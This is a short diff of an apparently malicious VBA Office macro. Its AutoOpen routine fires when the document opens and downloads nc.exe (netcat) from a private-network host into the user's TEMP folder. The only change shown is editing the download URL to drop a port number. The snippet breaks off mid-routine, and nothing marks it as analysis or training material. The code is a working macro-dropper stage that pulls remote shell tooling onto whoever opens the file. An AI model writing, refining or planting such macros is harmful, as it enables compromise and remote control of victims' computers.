@@ -1,7 +1,7 @@
 Sub AutoOpen()
     Dim strUrl As String
     Dim strPath As String
-    strUrl = "http://192.168.31.186:8888/nc.exe"
+    strUrl = "http://192.168.31.186/nc.exe"
     strPath = Environ("TEMP") & "\nc.exe"
 
     With CreateObject("Microsoft.XMLHTTP")
